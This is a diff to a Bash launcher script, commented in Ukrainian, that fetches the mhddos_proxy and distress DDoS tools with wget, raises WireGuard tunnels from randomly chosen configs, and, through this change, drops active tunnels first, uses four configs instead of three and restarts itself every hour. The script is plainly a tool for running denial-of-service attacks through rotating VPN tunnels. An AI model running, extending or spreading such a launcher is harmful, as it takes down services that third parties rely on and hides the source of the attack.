@@ -4,6 +4,7 @@ MODULE_DIR="modules"
 WG_DIR="/etc/wireguard"
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
+SCRIPT_PATH="$(realpath "$0")"
 
 #=== Створення конфігів .ini при відсутності ===
 echo "[+] Перевірка конфігів .ini..."
@@ -63,18 +64,24 @@ if ! compgen -G "$WG_DIR/*.conf" > /dev/null; then
     exit 1
 fi
 
+#=== Зупинка попередніх WG-тунелів ===
+echo "[+] Вимкнення попередніх WG-тунелів..."
+ACTIVE_WG=$(wg show interfaces 2>/dev/null)
+for iface in $ACTIVE_WG; do
+    sudo wg-quick down "$iface" && echo "[-] Вимкнено: $iface"
+done
+
 #=== Завантаження модулів ===
 echo "[+] Перевірка наявності модулів..."
 [ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
 [ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl
 
 #=== Рандомний вибір WG-конфігів і запуск ===
-echo "[+] Випадковий вибір 3 WireGuard конфігів з $WG_DIR..."
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 3))
+echo "[+] Випадковий вибір 4 WireGuard конфігів з $WG_DIR..."
+WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
 WG_IFACES=()
 
 for conf in "${WG_FILES[@]}"; do
-    sudo wg-quick down "$conf" 2>/dev/null
     sudo wg-quick up "$conf" || echo "[-] Не вдалося підключити $conf"
     iface=$(basename "$conf" .conf)
     WG_IFACES+=("$iface")
@@ -155,3 +162,7 @@ else
     echo "[-] Невірний вибір запуску."
     exit 1
 fi
+
+#=== Автоматичний перезапуск скрипта щогодини ===
+echo "[+] Автоматичний перезапуск через 1 годину..."
+sleep $(($(date -d 'next hour' +%s) - $(date +%s) - 60)) && exec "$SCRIPT_PATH" &
